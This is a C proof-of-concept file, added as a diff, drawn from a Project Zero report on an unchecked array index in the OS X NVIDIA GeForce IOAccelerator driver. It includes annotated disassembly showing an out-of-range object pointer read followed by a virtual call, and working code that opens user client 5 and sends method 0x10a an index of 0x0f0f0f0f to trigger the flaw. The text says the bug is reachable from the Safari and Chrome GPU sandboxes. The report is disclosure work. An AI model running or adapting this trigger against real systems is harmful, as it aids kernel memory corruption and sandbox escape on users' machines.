@@ -1,0 +1,147 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=709
+
+nvDevice::ReleaseDeviceTexture is external method 0x10a of userclient 5 of the geforce IOAccelerator.
+It takes a single uint argument
+
+__text:000000000001BCD2                 mov     r14d, esi
+  ...
+__text:000000000001BD08                 and     r14d, 7FFFFFFFh   <-- clear upper bit
+__text:000000000001BD0F                 mov     rax, [r15+168h]
+__text:000000000001BD16                 mov     rdi, [rax+r14*8]  <-- use as array index
+__text:000000000001BD1A                 test    rdi, rdi
+__text:000000000001BD1D                 jz      short loc_1BD2C
+__text:000000000001BD1F                 mov     rax, [rdi]          <-- read vtable
+__text:000000000001BD22                 call    qword ptr [rax+28h] <-- call OSObject::release
+
+This userclient is part of the nvidia geforce driver so it's only available on devices with that hardware (eg macbookpro.)
+
+This code is reachable from most interesting sandboxes including the safari renderer and the chrome GPU process.
+*/
+
+//ianbeer
+
+// build: clang -o nv_oob nv_oob.c -framework IOKit
+// tested on MacBookPro 10,1  w/10.11.3 (15D21) - if you test on machine with a different graphics setup then make you open the correct user client :)
+
+/*
+OS X Kernel unchecked array index used to read object pointer then call virtual method in nvdia geforce driver
+
+nvDevice::ReleaseDeviceTexture is external method 0x10a of userclient 5 of the geforce IOAccelerator.
+It takes a single uint argument
+
+__text:000000000001BCD2                 mov     r14d, esi
+  ...
+__text:000000000001BD08                 and     r14d, 7FFFFFFFh   <-- clear upper bit
+__text:000000000001BD0F                 mov     rax, [r15+168h]
+__text:000000000001BD16                 mov     rdi, [rax+r14*8]  <-- use as array index
+__text:000000000001BD1A                 test    rdi, rdi
+__text:000000000001BD1D                 jz      short loc_1BD2C
+__text:000000000001BD1F                 mov     rax, [rdi]          <-- read vtable
+__text:000000000001BD22                 call    qword ptr [rax+28h] <-- call OSObject::release
+
+This userclient is part of the nvidia geforce driver so it's only available on devices with that hardware (eg macbookpro.)
+
+This code is reachable from most interesting sandboxes including the safari renderer and the chrome GPU process.
+*/
+
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <IOKit/IOKitLib.h>
+
+uint64_t release_device_texture(mach_port_t conn) {
+  kern_return_t err;
+  
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+
+  inputScalarCnt = 1;
+  inputStructCnt = 0;
+
+  outputScalarCnt = 0;
+  outputStructCnt = 0;
+
+  inputScalar[0] = 0x0f0f0f0f;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x10a,
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+  } else{
+    printf("worked?\n");
+  }
+  
+  return 0;
+}
+
+mach_port_t get_user_client(char* name, int type) {
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching(name);
+  if(!matching){
+   printf("unable to create service matching dictionary\n");
+   return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+   printf("no matches\n");
+   return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+
+  if (service == IO_OBJECT_NULL){
+   printf("unable to find service\n");
+   return 0;
+  }
+  printf("got service: %x\n", service);
+
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), type, &conn);
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 0;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+
+  return conn;
+}
+
+
+
+int main(int argc, char** argv){
+  mach_port_t gl_context = get_user_client("IOAccelerator", 5);
+  release_device_texture(gl_context);
+  return 0;
+
+}
